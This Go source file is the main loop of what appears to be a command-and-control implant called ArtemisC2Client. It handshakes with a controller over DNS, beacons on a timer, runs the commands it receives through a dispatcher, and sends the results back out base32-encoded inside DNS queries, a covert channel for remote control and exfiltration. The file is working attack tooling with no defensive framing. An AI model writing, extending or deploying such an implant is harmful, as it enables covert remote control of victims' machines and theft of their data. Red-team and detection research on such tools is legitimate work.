package main

import (
	"fmt"
	"strings"
	"time"

	"github.com/desertcod98/ArtemisC2Client/commands"
	"github.com/desertcod98/ArtemisC2Client/dns"
	"github.com/desertcod98/ArtemisC2Client/encoding"
)

var AgentId string
var BeaconInterval = 10 // seconds

func main() {
	handshakeRes, handshakeErr := dns.DnsQuery("handshake")
	if handshakeErr != nil {
		fmt.Println("Error:", handshakeErr)
		return
	}
	fmt.Println("Handhsake job id:", handshakeRes)

	completeHsRes, completeHsErr := dns.DnsQuery(handshakeRes)
	if completeHsErr != nil {
		fmt.Println("Error:", completeHsErr)
		return
	}
	AgentId = completeHsRes
	fmt.Println("Agent id:", AgentId)

	ticker := time.NewTicker(time.Duration(BeaconInterval) * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		beaconRes, beaconErr := dns.DnsQuery(AgentId + ".Beacon")
		if beaconErr != nil {
			fmt.Println("Error:", beaconErr)
			return
		}
		fmt.Println("Beacon response:", beaconRes)

		commandSplit := strings.Split(beaconRes, ".")
		if len(commandSplit) < 2 {
			continue
		}

		reverseStringArr(commandSplit)
		job := commandSplit[0]
		commandType := commandSplit[1]
		commandArgs := commandSplit[2:]

		if cmd, ok := commands.Dispatcher[strings.ToLower(commandType)]; ok {
			resultChan := cmd.Execute(commandArgs)
			result := <-resultChan
			dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
		}
	}
}

func reverseStringArr(input []string) {
	for i, j := 0, len(input)-1; i < j; i, j = i+1, j-1 {
		input[i], input[j] = input[j], input[i]
	}
}
